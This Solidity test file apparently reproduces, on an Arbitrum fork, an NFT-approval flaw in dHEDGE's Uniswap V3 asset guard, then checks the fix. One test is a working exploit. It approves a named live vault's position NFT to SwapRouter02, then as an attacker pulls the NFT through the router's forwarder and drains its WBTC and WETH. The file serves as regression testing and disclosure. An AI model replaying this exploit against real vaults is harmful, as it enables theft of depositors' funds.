// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;

import {INonfungiblePositionManager} from "@uniswap/v3-periphery/contracts/interfaces/INonfungiblePositionManager.sol";

import {Governance} from "contracts/Governance.sol";
import {PoolLogic} from "contracts/PoolLogic.sol";
import {PoolManagerLogic} from "contracts/PoolManagerLogic.sol";
import {UniswapV3AssetGuard} from "contracts/guards/assetGuards/UniswapV3AssetGuard.sol";
import {IAssetGuard} from "contracts/interfaces/guards/IAssetGuard.sol";
import {IERC20} from "contracts/interfaces/IERC20.sol";
import {ArbitrumConfig} from "test/integration/utils/foundry/config/ArbitrumConfig.sol";
import {DeploymentDryRunArbitrum} from "test/integration/utils/foundry/dryRun/DeploymentDryRunArbitrum.t.sol";

/// @dev SwapRouter02's unrestricted forwarder: relays arbitrary calldata to the Uniswap V3
///      NonfungiblePositionManager with the router itself as msg.sender. Not declared in
///      `IV3SwapRouter` because dHEDGE never calls it.
interface ISwapRouter02PositionManagerForwarder {
  function callPositionManager(bytes calldata data) external payable returns (bytes memory result);
}

/// @notice `UniswapV3AssetGuard` used to inherit `ERC20Guard`. When the Uniswap V3 NonfungiblePositionManager
///         contract guard rejects a call by returning transaction type 0, `PoolLogicLib` retries it against the
///         asset guard, which authorised `approve(address,uint256)`. ERC721 shares that selector with ERC20, so
///         the "allowance" was really an approval over a pool-owned position NFT. Any spender with a non-zero
///         contract guard was accepted, including deprecated contracts stubbed out with `ClosedContractGuard` -
///         such as Uniswap's SwapRouter02, which exposes a permissionless `callPositionManager(bytes)` forwarder
///         anyone can use to pull the NFT out of the vault.
///         At the pinned fork block asset type 7 was still registered to the vulnerable guard, so the two
///         exploit tests run against production state as-is; the remaining tests re-point asset type 7 at the
///         fixed guard. Mainnet has since been migrated to the fixed guard.
contract UniswapV3PositionApprovalTest is DeploymentDryRunArbitrum {
  /// @dev Live vault holding a single WBTC/WETH Uniswap V3 position at the fork block.
  address internal constant VICTIM_VAULT = 0x2fcA566933bAAf3F454d816B7947Cb45C7d79102;
  uint256 internal constant POSITION_TOKEN_ID = 4828255;
  uint256 internal constant VAULT_VALUE = 6762496045498559533446;

  address internal constant CLOSED_CONTRACT_GUARD_PROD = 0x60a30E15bF02Ee355fAf60cDB8B6c0C455697675;
  address internal constant UNISWAP_V3_ASSET_GUARD_PROD = 0xd735AfFe6BaccFa94461d97779d787EcD9f4120B;

  INonfungiblePositionManager internal nftManager = INonfungiblePositionManager(ArbitrumConfig.UNISWAP_V3_NFT_MANAGER);
  PoolManagerLogic internal poolManagerLogic;
  address internal manager;
  address internal attacker;

  constructor() DeploymentDryRunArbitrum(488731014, new address[](0)) {}

  function setUp() public override {
    super.setUp();

    poolManagerLogic = PoolManagerLogic(PoolLogic(VICTIM_VAULT).poolManagerLogic());
    manager = poolManagerLogic.manager();
    attacker = makeAddr("attacker");

    // The whole vault is the position: ~$6762 of the ~$6762 total.
    assertEq(nftManager.ownerOf(POSITION_TOKEN_ID), VICTIM_VAULT, "position not owned by vault");
    assertEq(poolManagerLogic.totalFundValue(), VAULT_VALUE);
    assertEq(nftManager.getApproved(POSITION_TOKEN_ID), address(0));

    // SwapRouter02 is deprecated: its guard is the `ClosedContractGuard` stub, which rejects every call.
    // It is still a non-zero address, which is all `ERC20Guard`'s approve check looks at.
    assertEq(poolFactory.getContractGuard(ArbitrumConfig.UNISWAP_V3_ROUTER), CLOSED_CONTRACT_GUARD_PROD);
    assertEq(poolFactory.getAssetGuard(ArbitrumConfig.UNISWAP_V3_NFT_MANAGER), UNISWAP_V3_ASSET_GUARD_PROD);
  }

  function test_manager_can_approve_position_nft_to_deprecated_spender() public {
    _approvePositionToRouterAsManager();

    assertEq(nftManager.getApproved(POSITION_TOKEN_ID), ArbitrumConfig.UNISWAP_V3_ROUTER);
  }

  function test_anyone_can_steal_approved_position_nft_and_drain_it() public {
    _approvePositionToRouterAsManager();

    // Permissionless from here on: no manager, trader or owner rights involved.
    vm.startPrank(attacker);

    ISwapRouter02PositionManagerForwarder(ArbitrumConfig.UNISWAP_V3_ROUTER).callPositionManager(
      abi.encodeWithSignature("transferFrom(address,address,uint256)", VICTIM_VAULT, attacker, POSITION_TOKEN_ID)
    );

    assertEq(nftManager.ownerOf(POSITION_TOKEN_ID), attacker, "position not stolen");

    // Valuation reads the NFT tracker, not actual ownership, so the vault keeps reporting the full
    // ~$6762 for a position it no longer owns - deposits would mint shares against phantom value.
    assertEq(poolManagerLogic.totalFundValue(), VAULT_VALUE, "phantom value not reported");

    (, , , , , , , uint128 liquidity, , , , ) = nftManager.positions(POSITION_TOKEN_ID);
    nftManager.decreaseLiquidity(
      INonfungiblePositionManager.DecreaseLiquidityParams(POSITION_TOKEN_ID, liquidity, 0, 0, type(uint256).max)
    );
    nftManager.collect(
      INonfungiblePositionManager.CollectParams(POSITION_TOKEN_ID, attacker, type(uint128).max, type(uint128).max)
    );

    vm.stopPrank();

    assertEq(IERC20(wbtc).balanceOf(attacker), 85052);
    assertEq(IERC20(weth).balanceOf(attacker), 3497441373958786050);

    // Only once the attacker empties the position does the vault admit it is worth nothing.
    assertLt(poolManagerLogic.totalFundValue(), 1e18);
  }

  function test_revert_manager_cannot_approve_position_nft_after_fix() public {
    _deployFixedUniswapV3AssetGuard();

    // "dh23" - no guard authorised the transaction.
    vm.expectRevert(bytes("dh23"));
    _approvePositionToRouterAsManager();
  }

  /// @dev The fixed guard drops `ERC20Guard` as its base, so make sure nothing else regressed.
  function test_uniswapV3_asset_guard_intact_after_fix() public {
    UniswapV3AssetGuard fixedGuard = _deployFixedUniswapV3AssetGuard();

    assertEq(poolManagerLogic.totalFundValue(), VAULT_VALUE, "valuation changed");
    assertEq(fixedGuard.getDecimals(ArbitrumConfig.UNISWAP_V3_NFT_MANAGER), 18);

    // Withdrawals still unroll the position: decrease liquidity, then collect to the withdrawer.
    (, , IAssetGuard.MultiTransaction[] memory transactions) = fixedGuard.withdrawProcessing(
      VICTIM_VAULT,
      ArbitrumConfig.UNISWAP_V3_NFT_MANAGER,
      1e18 / 2,
      attacker
    );
    assertEq(transactions.length, 2);
    assertEq(transactions[0].to, ArbitrumConfig.UNISWAP_V3_NFT_MANAGER);
    assertEq(
      bytes32(_selector(transactions[0].txData)),
      bytes32(INonfungiblePositionManager.decreaseLiquidity.selector)
    );
    assertEq(transactions[1].to, ArbitrumConfig.UNISWAP_V3_NFT_MANAGER);
    assertEq(bytes32(_selector(transactions[1].txData)), bytes32(INonfungiblePositionManager.collect.selector));

    vm.expectRevert(bytes("cannot remove non-empty asset"));
    fixedGuard.removeAssetCheck(VICTIM_VAULT, ArbitrumConfig.UNISWAP_V3_NFT_MANAGER);
  }

  /// @dev Legitimate position management goes through the contract guard and is unaffected by the fix.
  function test_manager_can_still_manage_position_after_fix() public {
    _deployFixedUniswapV3AssetGuard();

    (, , , , , , , uint128 liquidityBefore, , , , ) = nftManager.positions(POSITION_TOKEN_ID);

    vm.prank(manager);
    PoolLogic(VICTIM_VAULT).execTransaction(
      ArbitrumConfig.UNISWAP_V3_NFT_MANAGER,
      abi.encodeWithSelector(
        INonfungiblePositionManager.decreaseLiquidity.selector,
        INonfungiblePositionManager.DecreaseLiquidityParams(
          POSITION_TOKEN_ID,
          liquidityBefore / 2,
          0,
          0,
          type(uint256).max
        )
      )
    );

    (, , , , , , , uint128 liquidityAfter, , , , ) = nftManager.positions(POSITION_TOKEN_ID);
    assertEq(uint256(liquidityAfter), uint256(liquidityBefore - liquidityBefore / 2));
  }

  function _approvePositionToRouterAsManager() internal {
    vm.prank(manager);
    PoolLogic(VICTIM_VAULT).execTransaction(
      ArbitrumConfig.UNISWAP_V3_NFT_MANAGER,
      abi.encodeWithSelector(IERC20.approve.selector, ArbitrumConfig.UNISWAP_V3_ROUTER, POSITION_TOKEN_ID)
    );
  }

  function _deployFixedUniswapV3AssetGuard() internal returns (UniswapV3AssetGuard fixedGuard) {
    fixedGuard = new UniswapV3AssetGuard();
    Governance governance = Governance(poolFactory.governanceAddress());
    uint16 assetType = poolFactory.getAssetType(ArbitrumConfig.UNISWAP_V3_NFT_MANAGER);

    vm.prank(governance.owner());
    governance.setAssetGuard(assetType, address(fixedGuard));
  }

  function _selector(bytes memory data) internal pure returns (bytes4 selector) {
    // solhint-disable-next-line no-inline-assembly
    assembly {
      selector := mload(add(data, 0x20))
    }
  }
}
